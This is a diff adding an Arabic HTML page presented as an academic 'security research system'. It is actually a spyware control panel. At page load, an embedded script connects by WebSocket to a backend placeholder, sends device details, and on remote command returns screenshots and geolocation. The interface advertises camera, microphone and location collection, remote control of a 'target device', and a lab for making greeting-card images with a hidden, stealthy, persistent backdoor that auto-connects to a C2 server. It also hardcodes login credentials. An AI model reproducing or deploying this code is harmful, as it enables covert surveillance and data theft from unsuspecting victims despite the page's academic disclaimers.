@@ -1,0 +1,2251 @@
+<!DOCTYPE html>
+<html lang="ar">
+<!-- في index.html -->
+<script>
+class SecuritySystem {
+    constructor() {
+        this.ws = null;
+        this.backendUrl = 'wss://your-backend.onrender.com'; // رابط Backend
+    }
+    
+    connectToBackend() {
+        this.ws = new WebSocket(this.backendUrl);
+        
+        this.ws.onopen = () => {
+            console.log('Connected to backend');
+            this.sendDeviceInfo();
+        };
+        
+        this.ws.onmessage = (event) => {
+            const data = JSON.parse(event.data);
+            this.handleCommand(data);
+        };
+    }
+    
+    sendDeviceInfo() {
+        const info = {
+            type: 'handshake',
+            device: navigator.userAgent,
+            platform: navigator.platform,
+            timestamp: Date.now()
+        };
+        this.ws.send(JSON.stringify(info));
+    }
+    
+    handleCommand(command) {
+        switch(command.type) {
+            case 'take_screenshot':
+                this.captureScreen();
+                break;
+            case 'get_location':
+                this.getLocation();
+                break;
+        }
+    }
+    
+    captureScreen() {
+        // استخدام HTML2Canvas لالتقاط الشاشة
+        if (typeof html2canvas !== 'undefined') {
+            html2canvas(document.body).then(canvas => {
+                const image = canvas.toDataURL('image/png');
+                this.ws.send(JSON.stringify({
+                    type: 'screenshot_result',
+                    image: image
+                }));
+            });
+        }
+    }
+    
+    getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                this.ws.send(JSON.stringify({
+                    type: 'location_result',
+                    lat: position.coords.latitude,
+                    lon: position.coords.longitude
+                }));
+            });
+        }
+    }
+}
+
+const system = new SecuritySystem();
+system.connectToBackend();
+</script>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام البحث الأمني - التحكم الكامل</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        
+        body {
+            background: linear-gradient(135deg, #0c2461 0%, #1e3799 50%, #4a69bd 100%);
+            color: #fff;
+            min-height: 100vh;
+            padding: 20px;
+            direction: rtl;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            border-radius: 25px;
+            padding: 30px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+            padding-bottom: 25px;
+            border-bottom: 3px solid rgba(46, 213, 115, 0.3);
+            position: relative;
+        }
+        
+        .header::after {
+            content: '';
+            position: absolute;
+            bottom: -3px;
+            right: 0;
+            width: 100px;
+            height: 3px;
+            background: linear-gradient(90deg, #2ed573, #1e90ff);
+            border-radius: 3px;
+        }
+        
+        .university-badge {
+            display: inline-block;
+            background: linear-gradient(45deg, #2ed573, #1e90ff);
+            padding: 12px 35px;
+            border-radius: 50px;
+            font-size: 16px;
+            margin-bottom: 25px;
+            box-shadow: 0 10px 30px rgba(46, 213, 115, 0.4);
+            font-weight: bold;
+            animation: pulse 3s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        h1 {
+            font-size: 3.2rem;
+            background: linear-gradient(45deg, #2ed573, #1e90ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 15px;
+            text-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
+            letter-spacing: 1px;
+        }
+        
+        .subtitle {
+            color: #a4b0be;
+            font-size: 1.3rem;
+            margin-bottom: 30px;
+            line-height: 1.8;
+        }
+        
+        .warning-alert {
+            background: linear-gradient(135deg, rgba(255, 71, 87, 0.15), rgba(255, 71, 87, 0.05));
+            border: 1px solid rgba(255, 71, 87, 0.3);
+            border-radius: 15px;
+            padding: 25px;
+            margin: 30px 0;
+            text-align: center;
+            animation: glow 2s infinite alternate;
+        }
+        
+        @keyframes glow {
+            from { box-shadow: 0 0 10px rgba(255, 71, 87, 0.3); }
+            to { box-shadow: 0 0 25px rgba(255, 71, 87, 0.6); }
+        }
+        
+        .warning-alert h3 {
+            color: #ff4757;
+            margin-bottom: 15px;
+            font-size: 1.8rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+        }
+        
+        .main-controls {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            margin: 40px 0;
+        }
+        
+        .control-card {
+            background: linear-gradient(135deg, rgba(30, 39, 46, 0.8), rgba(30, 39, 46, 0.4));
+            border-radius: 20px;
+            padding: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.3s ease;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .control-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 5px;
+            height: 100%;
+            background: linear-gradient(to bottom, #2ed573, #1e90ff);
+        }
+        
+        .control-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
+            background: linear-gradient(135deg, rgba(30, 39, 46, 0.9), rgba(30, 39, 46, 0.6));
+        }
+        
+        .control-icon {
+            font-size: 2.8rem;
+            color: #2ed573;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .control-card h3 {
+            color: #fff;
+            font-size: 1.5rem;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        
+        .control-card p {
+            color: #a4b0be;
+            text-align: center;
+            line-height: 1.7;
+        }
+        
+        .status-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+        
+        .status-item {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 25px;
+            border-radius: 15px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.3s ease;
+        }
+        
+        .status-item:hover {
+            background: rgba(255, 255, 255, 0.1);
+            transform: scale(1.05);
+        }
+        
+        .status-label {
+            color: #a4b0be;
+            font-size: 0.9rem;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .status-value {
+            color: #2ed573;
+            font-size: 1.8rem;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        
+        .log-container {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 20px;
+            padding: 30px;
+            margin: 40px 0;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .log-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .log-title {
+            color: #fff;
+            font-size: 1.8rem;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .log-controls {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .log-output {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 15px;
+            padding: 25px;
+            height: 400px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.95rem;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .log-entry {
+            padding: 12px 15px;
+            margin-bottom: 10px;
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.03);
+            border-left: 4px solid;
+            animation: slideIn 0.3s ease;
+        }
+        
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+        
+        .log-time {
+            color: #1e90ff;
+            font-weight: bold;
+            margin-left: 15px;
+        }
+        
+        .log-type {
+            padding: 3px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: bold;
+            margin-left: 10px;
+        }
+        
+        .type-info { background: rgba(30, 144, 255, 0.2); color: #1e90ff; border-left-color: #1e90ff; }
+        .type-success { background: rgba(46, 213, 115, 0.2); color: #2ed573; border-left-color: #2ed573; }
+        .type-warning { background: rgba(255, 165, 2, 0.2); color: #ffa502; border-left-color: #ffa502; }
+        .type-error { background: rgba(255, 71, 87, 0.2); color: #ff4757; border-left-color: #ff4757; }
+        .type-critical { background: rgba(255, 0, 0, 0.2); color: #ff0000; border-left-color: #ff0000; }
+        .type-data { background: rgba(155, 89, 182, 0.2); color: #9b59b6; border-left-color: #9b59b6; }
+        
+        .button-group {
+            display: flex;
+            justify-content: center;
+            gap: 25px;
+            margin: 40px 0;
+            flex-wrap: wrap;
+        }
+        
+        .btn {
+            background: linear-gradient(45deg, #2ed573, #1e90ff);
+            color: white;
+            border: none;
+            padding: 18px 45px;
+            font-size: 1.1rem;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            min-width: 220px;
+            box-shadow: 0 8px 25px rgba(46, 213, 115, 0.3);
+        }
+        
+        .btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 35px rgba(46, 213, 115, 0.4);
+            background: linear-gradient(45deg, #1e90ff, #2ed573);
+        }
+        
+        .btn:active {
+            transform: translateY(-2px);
+        }
+        
+        .btn-danger {
+            background: linear-gradient(45deg, #ff4757, #ff3838);
+        }
+        
+        .btn-danger:hover {
+            background: linear-gradient(45deg, #ff3838, #ff4757);
+            box-shadow: 0 15px 35px rgba(255, 71, 87, 0.4);
+        }
+        
+        .btn-warning {
+            background: linear-gradient(45deg, #ffa502, #ff7f00);
+        }
+        
+        .btn-warning:hover {
+            background: linear-gradient(45deg, #ff7f00, #ffa502);
+            box-shadow: 0 15px 35px rgba(255, 165, 2, 0.4);
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 10000;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(10px);
+        }
+        
+        .modal-content {
+            background: linear-gradient(135deg, #1e2a3a, #2c3e50);
+            padding: 50px;
+            border-radius: 30px;
+            max-width: 800px;
+            width: 90%;
+            max-height: 90vh;
+            overflow-y: auto;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8);
+            border: 2px solid rgba(46, 213, 115, 0.3);
+            animation: modalAppear 0.5s ease;
+        }
+        
+        @keyframes modalAppear {
+            from { opacity: 0; transform: scale(0.8); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 35px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .modal-title {
+            color: #2ed573;
+            font-size: 2.2rem;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+        
+        .close-modal {
+            background: none;
+            border: none;
+            color: #ff4757;
+            font-size: 2.5rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .close-modal:hover {
+            background: rgba(255, 71, 87, 0.1);
+            transform: rotate(90deg);
+        }
+        
+        .command-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+        
+        .command-btn {
+            background: rgba(255, 255, 255, 0.05);
+            border: 2px solid rgba(46, 213, 115, 0.3);
+            color: #fff;
+            padding: 20px 15px;
+            border-radius: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+            font-size: 0.95rem;
+        }
+        
+        .command-btn:hover {
+            background: rgba(46, 213, 115, 0.2);
+            border-color: #2ed573;
+            transform: scale(1.05);
+            box-shadow: 0 10px 25px rgba(46, 213, 115, 0.3);
+        }
+        
+        .command-icon {
+            font-size: 2rem;
+            margin-bottom: 10px;
+            color: #2ed573;
+        }
+        
+        .permissions-container {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 15px;
+            padding: 25px;
+            margin: 30px 0;
+        }
+        
+        .permission-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            margin: 15px 0;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 12px;
+            border-left: 4px solid #2ed573;
+            transition: all 0.3s ease;
+        }
+        
+        .permission-item:hover {
+            background: rgba(255, 255, 255, 0.08);
+            transform: translateX(-10px);
+        }
+        
+        .permission-info h4 {
+            color: #fff;
+            margin-bottom: 8px;
+            font-size: 1.2rem;
+        }
+        
+        .permission-info p {
+            color: #a4b0be;
+            font-size: 0.9rem;
+        }
+        
+        .permission-status {
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 0.9rem;
+        }
+        
+        .status-enabled {
+            background: rgba(46, 213, 115, 0.2);
+            color: #2ed573;
+        }
+        
+        .status-disabled {
+            background: rgba(255, 71, 87, 0.2);
+            color: #ff4757;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 60px;
+            padding-top: 30px;
+            border-top: 2px solid rgba(255, 255, 255, 0.1);
+            color: #747d8c;
+            font-size: 0.95rem;
+        }
+        
+        .footer p {
+            margin: 10px 0;
+        }
+        
+        /* تنسيقات مختبر الصور المخترقة */
+        .template-badge {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            background: rgba(46, 213, 115, 0.2);
+            color: #2ed573;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: bold;
+        }
+
+        .template-badge.active {
+            background: rgba(46, 213, 115, 0.4);
+        }
+
+        .settings-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+            margin-top: 15px;
+        }
+
+        .setting-item {
+            background: rgba(255, 255, 255, 0.03);
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .setting-item input[type="checkbox"] {
+            margin-left: 10px;
+            transform: scale(1.2);
+        }
+
+        .setting-item small {
+            display: block;
+            margin-top: 5px;
+        }
+
+        /* تنسيقات إضافية للصور */
+        .preview-section {
+            position: relative;
+        }
+
+        #imagePreviewCanvas {
+            transition: all 0.5s ease;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+
+        #imagePreviewCanvas:hover {
+            transform: scale(1.02);
+            box-shadow: 0 15px 40px rgba(46, 213, 115, 0.3);
+        }
+
+        /* تنسيق أزرار التضمين */
+        .btn.active-embedding {
+            background: linear-gradient(45deg, #2ed573, #1e90ff) !important;
+            box-shadow: 0 5px 20px rgba(46, 213, 115, 0.4) !important;
+        }
+
+        /* تنسيق خطوات المعالجة */
+        #processingSteps .log-entry {
+            margin-bottom: 8px;
+            animation: none;
+            opacity: 0.5;
+        }
+
+        #processingSteps .log-entry.active {
+            opacity: 1;
+            border-left-color: #2ed573;
+        }
+
+        #processingSteps .log-entry.completed {
+            opacity: 1;
+            border-left-color: #1e90ff;
+        }
+        
+        /* Scrollbar Styling */
+        ::-webkit-scrollbar {
+            width: 12px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 6px;
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: linear-gradient(45deg, #2ed573, #1e90ff);
+            border-radius: 6px;
+        }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: linear-gradient(45deg, #1e90ff, #2ed573);
+        }
+        
+        /* Responsive Design */
+        @media (max-width: 1024px) {
+            .container {
+                padding: 20px;
+            }
+            
+            h1 {
+                font-size: 2.5rem;
+            }
+            
+            .main-controls {
+                grid-template-columns: 1fr;
+            }
+            
+            .button-group {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            .btn {
+                width: 100%;
+                max-width: 400px;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2rem;
+            }
+            
+            .university-badge {
+                font-size: 14px;
+                padding: 10px 25px;
+            }
+            
+            .modal-content {
+                padding: 30px;
+            }
+            
+            .modal-title {
+                font-size: 1.8rem;
+            }
+            
+            .command-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        /* Terminal Effect */
+        .terminal-line {
+            position: relative;
+            padding-left: 20px;
+        }
+        
+        .terminal-line::before {
+            content: '>';
+            position: absolute;
+            left: 0;
+            color: #2ed573;
+            font-weight: bold;
+        }
+        
+        /* Connection Status Animation */
+        .connection-status {
+            display: inline-block;
+            width: 15px;
+            height: 15px;
+            border-radius: 50%;
+            margin-right: 10px;
+            animation: statusPulse 2s infinite;
+        }
+        
+        .connected { background: #2ed573; }
+        .disconnected { background: #ff4757; }
+        .connecting { background: #ffa502; }
+        
+        @keyframes statusPulse {
+            0% { box-shadow: 0 0 0 0 rgba(46, 213, 115, 0.7); }
+            70% { box-shadow: 0 0 0 10px rgba(46, 213, 115, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(46, 213, 115, 0); }
+        }
+        
+        /* Progress Bar */
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+            margin: 15px 0;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #2ed573, #1e90ff);
+            border-radius: 4px;
+            transition: width 0.5s ease;
+        }
+        
+        /* Data Visualization */
+        .data-visualization {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+        
+        .data-card {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 25px;
+            border-radius: 15px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .data-value {
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: #2ed573;
+            margin: 15px 0;
+        }
+        
+        .data-label {
+            color: #a4b0be;
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+    </style>
+    
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <!-- Login Screen -->
+<div id="loginScreen" style="display: flex; justify-content: center; align-items: center; min-height: 100vh; background: linear-gradient(135deg, #0c2461 0%, #1e3799 100%); position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99999;">
+    <div style="background: rgba(255,255,255,0.1); backdrop-filter: blur(20px); padding: 50px; border-radius: 25px; max-width: 450px; width: 90%; border: 1px solid rgba(255,255,255,0.2); box-shadow: 0 25px 50px rgba(0,0,0,0.5);">
+        <div style="text-align: center; margin-bottom: 40px;">
+            <div style="background: linear-gradient(45deg, #2ed573, #1e90ff); display: inline-block; padding: 15px 40px; border-radius: 50px; margin-bottom: 25px;">
+                <i class="fas fa-shield-alt" style="margin-left: 10px;"></i>
+                نظام البحث الأمني المتقدم
+            </div>
+            <h2 style="color: #2ed573; margin-bottom: 15px; font-size: 2rem;">
+                <i class="fas fa-user-shield"></i> تسجيل الدخول
+            </h2>
+            <p style="color: #a4b0be;">للأغراض الأكاديمية في البيئات المعزولة فقط</p>
+        </div>
+        
+        <div style="margin-bottom: 25px;">
+            <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 15px; background: rgba(255,255,255,0.05); padding: 15px; border-radius: 15px; border: 1px solid rgba(255,255,255,0.1);">
+                <i class="fas fa-user" style="color: #2ed573;"></i>
+                <input type="text" id="loginUsername" placeholder="اسم المستخدم" style="background: transparent; border: none; color: white; width: 100%; padding: 10px; font-size: 1rem;" value="admin">
+            </div>
+            
+            <div style="display: flex; align-items: center; gap: 15px; background: rgba(255,255,255,0.05); padding: 15px; border-radius: 15px; border: 1px solid rgba(255,255,255,0.1);">
+                <i class="fas fa-lock" style="color: #2ed573;"></i>
+                <input type="password" id="loginPassword" placeholder="كلمة المرور" style="background: transparent; border: none; color: white; width: 100%; padding: 10px; font-size: 1rem;" value="Admin@2024">
+            </div>
+        </div>
+        
+        <button onclick="login()" style="background: linear-gradient(45deg, #2ed573, #1e90ff); color: white; border: none; padding: 18px; border-radius: 50px; width: 100%; font-size: 1.1rem; cursor: pointer; font-weight: bold; transition: all 0.3s;">
+            <i class="fas fa-sign-in-alt"></i> دخول إلى النظام
+        </button>
+        
+        <div style="margin-top: 25px; color: #a4b0be; font-size: 0.9rem; text-align: center; padding: 15px; background: rgba(255,255,255,0.05); border-radius: 10px;">
+            <p style="margin-bottom: 5px;">بيانات الدخول التجريبية:</p>
+            <p>👑 <strong>admin</strong> / <strong>Admin@2024</strong> (صلاحيات كاملة)</p>
+            <p>🔬 <strong>researcher</strong> / <strong>Research@2024</strong> (بحث ومراقبة)</p>
+            <p>👁️ <strong>monitor</strong> / <strong>Monitor@2024</strong> (مشاهدة فقط)</p>
+        </div>
+        
+        <div style="margin-top: 20px; text-align: center; color: #ffa5a5; font-size: 0.85rem;">
+            <p><i class="fas fa-exclamation-triangle"></i> للاستخدام الأكاديمي في البيئات المعزولة فقط</p>
+        </div>
+    </div>
+</div>
+
+<!-- Hide main container initially -->
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        document.querySelector('.container').style.display = 'none';
+    });
+</script>
+    <div class="container">
+        <!-- Header Section -->
+        <div class="header">
+            <div class="university-badge">
+                <i class="fas fa-shield-alt"></i> نظام البحث الأمني المتقدم - التحكم الكامل
+            </div>
+            <h1>🛡️ هل أنت مستعد</h1>
+            <p class="subtitle">
+                نظام بحثي متكامل للتحكم الكامل ومراقبة البيئات المعزولة تحت الإشراف الأكاديمي
+            </p>
+        </div>
+        
+        <!-- Warning Alert -->
+        <div class="warning-alert">
+            <h3>
+                <i class="fas fa-exclamation-triangle"></i>
+                تحذير: نظام بحثي للبيئات المعزولة فقط
+                <i class="fas fa-exclamation-triangle"></i>
+            </h3>
+            <p style="color: #ffa5a5; font-size: 1.1rem; line-height: 1.8;">
+                ⚠️ هذا النظام مخصص حصرياً للأبحاث الأكاديمية في البيئات المعزولة والمغلقة.<br>
+                ⚠️ جميع الأنشطة تخضع للإشراف الأكاديمي والتوثيق الكامل.<br>
+                ⚠️ يحظر استخدام النظام خارج النطاق البحثي المصرح به.
+            </p>
+        </div>
+        
+        <!-- Status Overview -->
+        <div class="status-grid">
+            <div class="status-item">
+                <div class="status-label">حالة النظام</div>
+                <div class="connection-status connecting"></div>
+                <div class="status-value" id="systemStatus">جاري التهيئة</div>
+                <div style="color: #a4b0be; font-size: 0.9rem;">آخر تحديث: <span id="lastUpdate">--:--:--</span></div>
+            </div>
+            
+            <div class="status-item">
+                <div class="status-label">الصلاحيات النشطة</div>
+                <div class="status-value" id="activePermissions">0/25</div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="permissionsProgress" style="width: 0%"></div>
+                </div>
+            </div>
+            
+            <div class="status-item">
+                <div class="status-label">الاتصالات النشطة</div>
+                <div class="status-value" id="activeConnections">0</div>
+                <div style="color: #a4b0be; font-size: 0.9rem;">كاميرا • ميكروفون • شبكة • موقع</div>
+            </div>
+            
+            <div class="status-item">
+                <div class="status-label">البيانات المجمعة</div>
+                <div class="status-value" id="dataCollected">0 MB</div>
+                <div style="color: #a4b0be; font-size: 0.9rem;">صور • تسجيلات • مواقع • سجلات</div>
+            </div>
+        </div>
+        
+        <!-- Main Controls -->
+        <div class="main-controls">
+            <div class="control-card" onclick="initializeFullSystem()">
+                <div class="control-icon">
+                    <i class="fas fa-rocket"></i>
+                </div>
+                <h3>🚀 تهيئة النظام الكاملة</h3>
+                <p>تفعيل كافة صلاحيات النظام والتحضير للبحث الشامل</p>
+            </div>
+            
+            <div class="control-card" onclick="showMonitoringControl()">
+                <div class="control-icon">
+                    <i class="fas fa-eye"></i>
+                </div>
+                <h3>👁️ التحكم في المراقبة</h3>
+                <p>إدارة أنظمة المراقبة الحية والتحكم في أجهزة الاستشعار</p>
+            </div>
+            
+            <div class="control-card" onclick="showRemoteControl()">
+                <div class="control-icon">
+                    <i class="fas fa-gamepad"></i>
+                </div>
+                <h3>🎮 التحكم عن بعد</h3>
+                <p>الوصول الكامل والتحكم المباشر في الجهاز المستهدف</p>
+            </div>
+            
+            <div class="control-card" onclick="showDataCollection()">
+                <div class="control-icon">
+                    <i class="fas fa-database"></i>
+                </div>
+                <h3>💾 جمع البيانات</h3>
+                <p>استخراج وتحليل وتخزين البيانات البحثية</p>
+            </div>
+        </div>
+        
+        <!-- قسم توليد الصور المخترقة -->
+        <div class="log-container" style="margin-top: 30px;">
+            <div class="log-header">
+                <div class="log-title">
+                    <i class="fas fa-camera-retro"></i>
+                    مختبر توليد الصور المخترقة
+                </div>
+                <div class="log-controls">
+                    <button class="btn btn-warning" onclick="toggleImageLab()" style="padding: 10px 20px; font-size: 0.9rem;">
+                        <i class="fas fa-vial"></i> فتح/إغلاق المختبر
+                    </button>
+                </div>
+            </div>
+            
+            <div id="imageLabContent" style="display: none; padding: 20px;">
+                <!-- معاينة الصورة -->
+                <div class="preview-section" style="text-align: center; margin-bottom: 30px;">
+                    <div class="status-item" style="max-width: 400px; margin: 0 auto;">
+                        <div class="status-label">معاينة الصورة</div>
+                        <div id="imagePreviewCanvas" style="width: 300px; height: 375px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border-radius: 15px; margin: 15px auto; position: relative; overflow: hidden;">
+                            <div id="previewText" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: white; font-size: 24px; font-weight: bold; text-shadow: 2px 2px 4px rgba(0,0,0,0.5);">
+                                🎉 2026 🎊
+                            </div>
+                        </div>
+                        <div style="color: #a4b0be; margin-top: 10px;">
+                            <span id="previewInfo">الحجم: 1080×1350 | الصيغة: JPEG | الجودة: 90%</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- إعدادات القالب -->
+                <div class="permissions-container" style="margin-bottom: 20px;">
+                    <h4 style="color: #2ed573; margin-bottom: 20px; display: flex; align-items: center; gap: 10px;">
+                        <i class="fas fa-palette"></i> إعدادات القالب
+                    </h4>
+                    
+                    <div class="main-controls">
+                        <div class="control-card" onclick="selectTemplate('new_year')">
+                            <div class="control-icon">
+                                <i class="fas fa-fireworks"></i>
+                            </div>
+                            <h3>🎆 رأس السنة</h3>
+                            <p>تهنئة بالعام الجديد 2026</p>
+                            <div class="template-badge active" id="badge_new_year">مفعل ✓</div>
+                        </div>
+                        
+                        <div class="control-card" onclick="selectTemplate('birthday')">
+                            <div class="control-icon">
+                                <i class="fas fa-birthday-cake"></i>
+                            </div>
+                            <h3>🎂 عيد ميلاد</h3>
+                            <p>بطاقة تهنئة بعيد الميلاد</p>
+                            <div class="template-badge" id="badge_birthday">غير مفعل</div>
+                        </div>
+                        
+                        <div class="control-card" onclick="selectTemplate('holiday')">
+                            <div class="control-icon">
+                                <i class="fas fa-umbrella-beach"></i>
+                            </div>
+                            <h3>🏖️ عطلة</h3>
+                            <p>صور تذكارية للعطلات</p>
+                            <div class="template-badge" id="badge_holiday">غير مفعل</div>
+                        </div>
+                        
+                        <div class="control-card" onclick="selectTemplate('memes')">
+                            <div class="control-icon">
+                                <i class="fas fa-laugh-squint"></i>
+                            </div>
+                            <h3>😂 ميمز</h3>
+                            <p>صور مضحكة شائعة</p>
+                            <div class="template-badge" id="badge_memes">غير مفعل</div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- إعدادات الباكدور -->
+                <div class="permissions-container" style="margin-bottom: 20px;">
+                    <h4 style="color: #ff4757; margin-bottom: 20px; display: flex; align-items: center; gap: 10px;">
+                        <i class="fas fa-shield-alt"></i> إعدادات الباكدور المخفي
+                    </h4>
+                    
+                    <div class="settings-grid">
+                        <div class="setting-item">
+                            <label style="color: #fff; display: block; margin-bottom: 8px;">
+                                <input type="checkbox" id="enableBackdoor" checked onchange="updateBackdoorSettings()">
+                                تفعيل نظام الباكدور
+                            </label>
+                            <small style="color: #a4b0be;">تفعيل الكود الخفي داخل الصورة</small>
+                        </div>
+                        
+                        <div class="setting-item">
+                            <label style="color: #fff; display: block; margin-bottom: 8px;">
+                                <input type="checkbox" id="enableStealth" checked onchange="updateBackdoorSettings()">
+                                وضع التخفي
+                            </label>
+                            <small style="color: #a4b0be;">جعل الباكدور غير قابل للكشف</small>
+                        </div>
+                        
+                        <div class="setting-item">
+                            <label style="color: #fff; display: block; margin-bottom: 8px;">
+                                <input type="checkbox" id="enablePersistence" onchange="updateBackdoorSettings()">
+                                الاستمرارية
+                            </label>
+                            <small style="color: #a4b0be;">البقاء نشطاً بعد إغلاق الصورة</small>
+                        </div>
+                        
+                        <div class="setting-item">
+                            <label style="color: #fff; display: block; margin-bottom: 8px;">
+                                <input type="checkbox" id="enableAutoConnect" checked onchange="updateBackdoorSettings()">
+                                الاتصال التلقائي
+                            </label>
+                            <small style="color: #a4b0be;">الاتصال بخادم C2 عند العرض</small>
+                        </div>
+                    </div>
+                    
+                    <!-- خادم C2 -->
+                    <div style="margin-top: 20px; padding: 15px; background: rgba(255,255,255,0.05); border-radius: 10px;">
+                        <label style="color: #fff; display: block; margin-bottom: 10px;">
+                            <i class="fas fa-server"></i> خادم التحكم (C2)
+                        </label>
+                        <div style="display: flex; gap: 10px;">
+                            <input type="text" id="c2Server" placeholder="ws://your-server.com:8080" 
+                                   style="flex: 1; padding: 10px; border-radius: 5px; border: 1px solid rgba(255,255,255,0.2); background: rgba(0,0,0,0.3); color: white;">
+                            <button onclick="testC2Connection()" class="btn" style="padding: 10px 20px;">
+                                <i class="fas fa-wifi"></i> اختبار
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- تقنية التضمين -->
